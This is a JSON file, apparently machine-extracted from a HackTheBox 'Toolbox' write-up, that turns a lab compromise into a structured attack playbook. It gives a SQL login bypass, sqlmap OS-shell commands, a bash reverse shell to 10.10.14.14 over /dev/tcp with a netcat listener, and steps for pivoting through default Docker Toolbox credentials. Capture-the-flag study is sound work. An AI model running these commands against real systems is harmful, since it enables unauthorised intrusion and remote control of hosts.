@@ -1,0 +1,924 @@
+{
+  "writeup_id": "Htb_Toolbox",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_docker_toolbox_sqli_pivot",
+    "primary_services": [
+      "https",
+      "ftp",
+      "ssh",
+      "smb",
+      "winrm"
+    ],
+    "port_signature": "21+22+135+139+443+445+5985",
+    "service_combination": "ftp+ssh+https+smb+winrm",
+    "os_family": "windows",
+    "environment_type": "docker_toolbox_hybrid",
+    "entry_vector": "sql_injection_to_rce",
+    "privilege_path": "postgres_container_to_windows_admin",
+    "attack_complexity": "easy",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "docker_toolbox_exe_on_ftp",
+      "postgresql_backend_with_md5",
+      "virtualbox_linux_vm_pivot",
+      "ssh_key_privilege_escalation"
+    ],
+    "environmental_clues": [
+      "apache_debian_on_windows_host",
+      "admin_subdomain_login_form",
+      "anonymous_ftp_access",
+      "openssh_for_windows"
+    ],
+    "similar_scenarios": [
+      "hybrid_container_environments",
+      "legacy_docker_setups"
+    ],
+    "unique_aspects": [
+      "docker_toolbox_legacy_stack",
+      "windows_virtualbox_linux_pivot",
+      "postgresql_sqlmap_rce",
+      "container_to_host_ssh_key"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "SQL_Injection_Discovery",
+        "success_reason": "Application displayed verbose PostgreSQL error messages revealing injection point",
+        "prerequisite_indicators": [
+          "web_application_with_login",
+          "database_backend_present",
+          "error_messages_enabled"
+        ],
+        "recognition_patterns": [
+          "pg_query() error messages",
+          "unterminated quoted string errors",
+          "database file paths in errors",
+          "function parameter warnings"
+        ],
+        "failure_modes": [
+          "error_messages_disabled",
+          "input_properly_sanitized",
+          "prepared_statements_used"
+        ],
+        "environmental_factors": [
+          "development_environment_settings",
+          "verbose_error_reporting_enabled",
+          "postgresql_backend_database"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "SQL_Authentication_Bypass",
+        "success_reason": "Simple OR 1=1 comment injection bypassed login logic",
+        "prerequisite_indicators": [
+          "sql_injection_vulnerability_confirmed",
+          "authentication_logic_bypassable",
+          "comment_syntax_supported"
+        ],
+        "recognition_patterns": [
+          "login form accepts special characters",
+          "boolean logic in WHERE clause",
+          "comment syntax (-- -) works",
+          "successful login without valid credentials"
+        ],
+        "failure_modes": [
+          "additional_authentication_layers",
+          "input_validation_present",
+          "stored_procedures_used"
+        ],
+        "environmental_factors": [
+          "basic_authentication_implementation",
+          "single_query_authentication_check",
+          "postgresql_comment_syntax_support"
+        ],
+        "success_probability": 0.89,
+        "typical_timeframe": "1-3 minutes"
+      },
+      {
+        "technique": "SQLMap_Automated_Exploitation",
+        "success_reason": "Multiple injection types identified enabling automated database extraction",
+        "prerequisite_indicators": [
+          "confirmed_sql_injection",
+          "http_request_capturable",
+          "database_responses_analyzable"
+        ],
+        "recognition_patterns": [
+          "boolean-based blind injection works",
+          "error-based injection available",
+          "CAST function exploitation possible",
+          "PostgreSQL-specific payloads succeed"
+        ],
+        "failure_modes": [
+          "rate_limiting_implemented",
+          "waf_blocking_requests",
+          "session_timeouts_too_short"
+        ],
+        "environmental_factors": [
+          "postgresql_database_backend",
+          "no_web_application_firewall",
+          "permissive_error_handling"
+        ],
+        "success_probability": 0.94,
+        "typical_timeframe": "10-30 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "PostgreSQL error message disclosure",
+        "discovery_method": "Single quote injection in login form",
+        "why_critical": "Revealed database type, file paths, and confirmed SQL injection vulnerability",
+        "how_to_recognize": [
+          "pg_query() function errors",
+          "file path disclosure (/var/www/admin/index.php)",
+          "SQL syntax error details",
+          "line number information"
+        ],
+        "follow_up_actions": [
+          "test_authentication_bypass",
+          "enumerate_with_sqlmap",
+          "identify_database_structure"
+        ]
+      },
+      {
+        "discovery": "Docker Toolbox environment",
+        "discovery_method": "FTP anonymous access and nmap service enumeration",
+        "why_critical": "Indicates containerized environment with potential VM pivot opportunities",
+        "how_to_recognize": [
+          "docker-toolbox.exe on FTP",
+          "mixed Windows/Linux services",
+          "SSH on Windows system",
+          "Apache on Windows host"
+        ],
+        "follow_up_actions": [
+          "identify_container_breakout_methods",
+          "look_for_vm_credentials",
+          "enumerate_docker_services"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "unauthenticated_web_user",
+        "escalation_method": "SQL_injection_to_RCE",
+        "why_possible": "PostgreSQL supports command execution functions and error messages indicate system access",
+        "recognition_signs": [
+          "postgresql_backend_confirmed",
+          "error_based_injection_available",
+          "file_path_disclosure_present",
+          "sqlmap_multiple_injection_types"
+        ],
+        "exploitation_path": "SQL Injection → Database Access → Command Execution → Container Shell"
+      },
+      {
+        "privilege_level": "container_access",
+        "escalation_method": "Docker_Toolbox_VM_pivot",
+        "why_possible": "Docker Toolbox uses VirtualBox VM with often default credentials",
+        "recognition_signs": [
+          "docker_toolbox_environment_identified",
+          "ssh_service_available",
+          "mixed_os_services_present",
+          "vm_infrastructure_indicators"
+        ],
+        "exploitation_path": "Container Shell → VM Discovery → Default Credentials → Host Access"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found mixed Windows/Linux services - SSH(22), SMB(445), WinRM(5985), HTTPS(443) with Apache/Debian",
+        "decision": "Identify containerized environment and focus on web application first",
+        "reasoning": "Port combination suggests Docker Toolbox setup with Linux containers on Windows host",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "smb_enumeration",
+            "when": "if web attacks fail"
+          },
+          {
+            "option": "winrm_bruteforce",
+            "when": "if credentials obtained"
+          }
+        ],
+        "success_indicators": [
+          "web_application_accessible",
+          "docker_toolbox_exe_found_on_ftp",
+          "certificate_reveals_vhost"
+        ],
+        "next_decision": "enumerate_web_application"
+      },
+      {
+        "step": 2,
+        "situation": "Login form with SQL error message revealing PostgreSQL backend",
+        "decision": "Exploit SQL injection for command execution",
+        "reasoning": "PostgreSQL supports stacked queries and OS command execution via shared libraries",
+        "confidence": 0.95,
+        "prerequisites": [
+          "sql_injection_confirmed",
+          "postgresql_identified"
+        ],
+        "success_indicators": [
+          "sqlmap_finds_multiple_injection_types",
+          "os_command_execution_works"
+        ],
+        "failure_fallbacks": [
+          "credential_extraction",
+          "file_upload_attempts"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Command execution achieved in PostgreSQL container",
+        "decision": "Pivot to Docker host using default credentials",
+        "reasoning": "Docker Toolbox uses predictable default credentials for VM access",
+        "confidence": 0.8,
+        "prerequisites": [
+          "container_shell_obtained",
+          "docker_environment_confirmed"
+        ],
+        "success_indicators": [
+          "ssh_access_to_docker_vm",
+          "docker_host_enumeration_possible"
+        ],
+        "failure_fallbacks": [
+          "credential_harvesting",
+          "container_escape_techniques"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_sql_injection_succeeds": {
+        "action": "escalate_to_command_execution",
+        "tools": [
+          "sqlmap --os-cmd",
+          "postgresql_shared_library"
+        ],
+        "next_phase": "container_enumeration"
+      },
+      "if_container_access_obtained": {
+        "action": "pivot_to_docker_host",
+        "alternatives": [
+          "default_credentials",
+          "ssh_key_discovery",
+          "docker_socket_abuse"
+        ],
+        "decision_criteria": "based_on_docker_toolbox_setup"
+      },
+      "if_docker_vm_accessed": {
+        "action": "search_for_host_credentials",
+        "purpose": "escalate_to_windows_host",
+        "tools": [
+          "ssh_key_enumeration",
+          "credential_files"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "try_sqlmap_os_cmd_on_postgresql_injection",
+        "reasoning": "postgresql_supports_shared_library_command_execution",
+        "applicability": "postgresql_sql_injection_confirmed"
+      },
+      {
+        "rule": "check_docker_toolbox_default_credentials",
+        "reasoning": "docker_toolbox_uses_predictable_defaults",
+        "applicability": "docker_toolbox_environment_identified"
+      },
+      {
+        "rule": "enumerate_ssh_keys_in_containers_for_host_access",
+        "reasoning": "containers_often_contain_host_access_credentials",
+        "applicability": "containerized_environment_with_host_pivot_needed"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "SQL Injection",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_application_present",
+          "database_backend_accessible",
+          "user_input_fields_exist"
+        ],
+        "success_indicators": [
+          "database_error_messages_visible",
+          "query_syntax_errors_returned",
+          "authentication_bypass_successful"
+        ],
+        "incompatible_with": [
+          "input_sanitization_enabled",
+          "prepared_statements_used",
+          "waf_blocking_requests"
+        ],
+        "confidence_boosters": [
+          "verbose_error_messages",
+          "legacy_application_stack",
+          "custom_authentication_forms"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Anonymous FTP Access",
+        "mitre_id": "T1021.003",
+        "required_services": [
+          "ftp"
+        ],
+        "required_ports": [
+          21
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "ftp_service_running",
+          "anonymous_login_enabled"
+        ],
+        "success_indicators": [
+          "anonymous_login_accepted",
+          "directory_listing_accessible",
+          "files_downloadable"
+        ],
+        "incompatible_with": [
+          "anonymous_access_disabled",
+          "authentication_required",
+          "service_not_running"
+        ],
+        "confidence_boosters": [
+          "default_ftp_configuration",
+          "legacy_system_indicators",
+          "filezilla_server_detected"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "Default Credentials",
+        "mitre_id": "T1078.001",
+        "required_services": [
+          "ssh",
+          "http",
+          "https",
+          "ftp"
+        ],
+        "required_ports": [
+          22,
+          80,
+          443,
+          21
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "service_authentication_required",
+          "default_installation_present"
+        ],
+        "success_indicators": [
+          "successful_authentication",
+          "access_granted_immediately",
+          "no_password_policy_enforced"
+        ],
+        "incompatible_with": [
+          "password_policy_enforced",
+          "account_lockout_enabled",
+          "credentials_changed_from_default"
+        ],
+        "confidence_boosters": [
+          "docker_toolbox_installation",
+          "legacy_system_configuration",
+          "development_environment_indicators"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "5-10 minutes"
+      },
+      {
+        "technique": "Container Escape",
+        "mitre_id": "T1611",
+        "required_services": [
+          "docker",
+          "ssh"
+        ],
+        "required_ports": [
+          22,
+          2376,
+          2377
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "containerized_environment_detected",
+          "docker_service_accessible",
+          "privileged_container_access"
+        ],
+        "success_indicators": [
+          "host_filesystem_accessible",
+          "docker_socket_available",
+          "ssh_keys_found_in_container"
+        ],
+        "incompatible_with": [
+          "container_hardening_enabled",
+          "user_namespaces_configured",
+          "seccomp_profiles_active"
+        ],
+        "confidence_boosters": [
+          "docker_toolbox_environment",
+          "virtualbox_vm_detected",
+          "ssh_keys_in_predictable_locations"
+        ],
+        "typical_success_rate": 0.7,
+        "estimated_time": "15-45 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "apache",
+          "nginx"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "nginx",
+          "IIS"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "postgresql_backend": {
+        "port_indicators": [
+          5432
+        ],
+        "service_indicators": [
+          "postgresql"
+        ],
+        "error_indicators": [
+          "pg_query",
+          "PostgreSQL",
+          "unterminated quoted string"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "docker_environment": {
+        "port_indicators": [
+          2376,
+          2377,
+          22
+        ],
+        "service_indicators": [
+          "docker",
+          "ssh"
+        ],
+        "file_indicators": [
+          "docker-toolbox.exe",
+          "/.dockerenv"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "windows_host": {
+        "port_indicators": [
+          135,
+          139,
+          445,
+          5985
+        ],
+        "service_indicators": [
+          "msrpc",
+          "netbios-ssn",
+          "microsoft-ds",
+          "winrm"
+        ],
+        "banner_indicators": [
+          "Windows",
+          "Microsoft"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "anonymous_ftp_access",
+          "when": "ftp_service_detected_and_anonymous_allowed",
+          "reason": "immediate_access_no_credentials_needed"
+        },
+        {
+          "attack": "sql_injection",
+          "when": "web_forms_present_and_database_errors_visible",
+          "reason": "high_success_rate_with_verbose_errors"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "default_credentials",
+          "when": "docker_toolbox_environment_detected",
+          "reason": "common_default_configurations_in_docker_toolbox"
+        },
+        {
+          "attack": "container_escape",
+          "when": "containerized_environment_confirmed",
+          "reason": "path_to_host_system_access"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "smb_enumeration",
+          "when": "smb_service_detected_but_anonymous_denied",
+          "reason": "requires_valid_credentials_first"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "SQL Injection Authentication Bypass",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "manual_injection",
+            "command_template": "' or 1=1-- -",
+            "actual_command": "' or 1=1-- -",
+            "output_pattern": "successful login bypass",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "vulnerable_login_form",
+          "postgresql_backend",
+          "insufficient_input_validation"
+        ],
+        "success_indicators": [
+          "error_messages_reveal_query_structure",
+          "authentication_bypass_successful",
+          "access_to_admin_dashboard"
+        ],
+        "common_failures": [
+          "input_sanitization_present",
+          "prepared_statements_used",
+          "web_application_firewall_blocking"
+        ],
+        "follow_up_techniques": [
+          "sqlmap_exploitation",
+          "database_enumeration",
+          "command_execution"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "SQLMap Automated Exploitation",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "sqlmap",
+            "command_template": "sqlmap -r {request_file} --force-ssl --batch --os-shell",
+            "actual_command": "sqlmap -r login.request --force-ssl --batch --os-shell",
+            "output_pattern": "os-shell> prompt",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "sqlmap_command_execution",
+            "command_template": "sqlmap -r {request_file} --force-ssl --batch --os-cmd {command}",
+            "actual_command": "sqlmap -r login.request --force-ssl --batch --os-cmd whoami",
+            "success_factors": [
+              "postgresql_dba_privileges",
+              "shared_library_upload_capability"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "sql_injection_vulnerability",
+          "postgresql_database",
+          "dba_privileges",
+          "file_write_permissions"
+        ],
+        "success_indicators": [
+          "command_execution_successful",
+          "reverse_shell_obtained",
+          "postgres_user_access"
+        ],
+        "common_failures": [
+          "insufficient_database_privileges",
+          "file_system_restrictions",
+          "network_connectivity_issues"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_upgrade",
+          "container_enumeration",
+          "privilege_escalation"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Reverse Shell via SQL Injection",
+        "mitre_id": "T1059.004",
+        "category": "execution",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "bash_reverse_shell",
+            "command_template": "bash -c \"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1\"",
+            "actual_command": "bash -c \"bash -i >& /dev/tcp/10.10.14.14/443 0>&1\"",
+            "output_pattern": "reverse shell connection",
+            "effectiveness_rating": 5,
+            "reliability": 0.85
+          },
+          {
+            "name": "netcat_listener",
+            "command_template": "nc -lnvp {port}",
+            "actual_command": "nc -lnvp 443",
+            "success_factors": [
+              "outbound_connectivity",
+              "bash_available"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "command_execution_capability",
+          "outbound_network_access",
+          "bash_shell_available"
+        ],
+        "success_indicators": [
+          "shell_connection_established",
+          "interactive_command_execution",
+          "file_system_access"
+        ],
+        "common_failures": [
+          "firewall_blocking_outbound",
+          "shell_not_available",
+          "network_restrictions"
+        ],
+        "follow_up_techniques": [
+          "shell_stabilization",
+          "privilege_escalation",
+          "lateral_movement"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Shell Stabilization",
+        "mitre_id": "T1059.004",
+        "category": "execution",
+        "phase": "post_exploitation",
+        "tools_used": [
+          {
+            "name": "python_pty",
+            "command_template": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+            "actual_command": "python3 -c 'import pty;pty.spawn(\"bash\")'",
+            "output_pattern": "full tty shell",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "stty_raw",
+            "command_template": "stty raw -echo; fg",
+            "actual_command": "stty raw -echo; fg",
+            "success_factors": [
+              "python_available",
+              "pty_module_present"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "basic_shell_access",
+          "python_installed",
+          "terminal_access"
+        ],
+        "success_indicators": [
+          "tab_completion_works",
+          "ctrl_c_handling_proper",
+          "full_terminal_functionality"
+        ],
+        "common_failures": [
+          "python_not_available",
+          "pty_module_missing",
+          "terminal_type_issues"
+        ],
+        "follow_up_techniques": [
+          "enumeration_scripts",
+          "file_transfers",
+          "privilege_escalation"
+        ],
+        "time_investment": "1-3 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "sqlmap",
+        "use_case": "automated_sql_injection_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "sql_injection_testing",
+          "database_exploitation"
+        ],
+        "alternatives": [
+          "manual_injection",
+          "burp_suite_pro"
+        ],
+        "best_practices": [
+          "save_clean_request_to_file",
+          "use_batch_mode_for_automation",
+          "try_os_shell_for_command_execution",
+          "enumerate_databases_systematically"
+        ]
+      },
+      {
+        "tool": "netcat",
+        "use_case": "reverse_shell_listener",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "reverse_shells",
+          "network_pivoting"
+        ],
+        "alternatives": [
+          "socat",
+          "metasploit_handlers"
+        ],
+        "best_practices": [
+          "use_common_ports_like_443_80",
+          "have_multiple_listeners_ready",
+          "upgrade_shell_immediately"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "sql_injection_to_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "' or 1=1-- -",
+            "purpose": "Bypass authentication via SQL injection",
+            "expected_output": "Access to admin dashboard"
+          },
+          {
+            "step": 2,
+            "command": "sqlmap -r login.request --force-ssl --batch",
+            "purpose": "Identify SQL injection vulnerabilities",
+            "expected_output": "Four injection types found"
+          },
+          {
+            "step": 3,
+            "command": "sqlmap -r login.request --force-ssl --batch --os-cmd whoami",
+            "purpose": "Test command execution capability",
+            "expected_output": "postgres user identified"
+          },
+          {
+            "step": 4,
+            "command": "nc -lnvp 443",
+            "purpose": "Start reverse shell listener",
+            "expected_output": "Listening on port 443"
+          },
+          {
+            "step": 5,
+            "command": "bash -c \"bash -i >& /dev/tcp/10.10.14.14/443 0>&1\"",
+            "purpose": "Execute reverse shell via sqlmap",
+            "expected_output": "Shell connection established"
+          },
+          {
+            "step": 6,
+            "command": "python3 -c 'import pty;pty.spawn(\"bash\")'",
+            "purpose": "Upgrade to full TTY shell",
+            "expected_output": "Interactive shell with job control"
+          }
+        ],
+        "success_rate": 0.9,
+        "typical_duration": "15-30 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Toolbox",
+      "difficulty": "Easy",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2021-04-12",
+      "author": "MinatoTW",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "beginner-intermediate",
+      "primary_attack_vectors": [
+        "sql_injection",
+        "container_escape",
+        "credential_reuse"
+      ],
+      "key_vulnerabilities": [
+        "sql_injection_rce",
+        "default_credentials",
+        "container_misconfiguration"
+      ],
+      "environment_type": "containerized_windows_host",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "sql_injection_to_rce",
+        "docker_toolbox_exploitation",
+        "container_pivoting"
+      ],
+      "prerequisite_knowledge": [
+        "sql_injection",
+        "docker_basics",
+        "ssh_key_usage"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "sql_injection",
+        "container_security",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "injection",
+        "lateral_movement",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "input_validation",
+        "change_default_credentials",
+        "container_hardening"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Admirer",
+        "Poison",
+        "Jeeves"
+      ],
+      "similarity_reasons": [
+        "sql_injection_entry",
+        "multi_stage_pivoting",
+        "windows_containers"
+      ],
+      "unique_aspects": [
+        "docker_toolbox_environment",
+        "virtualbox_vm_pivot",
+        "legacy_container_tech"
+      ],
+      "difficulty_factors": [
+        "multiple_pivot_points",
+        "container_technology_knowledge",
+        "credential_discovery"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T16:30:19.471934",
+    "original_file": "0xdf_writeups/Htb Toolbox.md",
+    "content_length": 21102,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
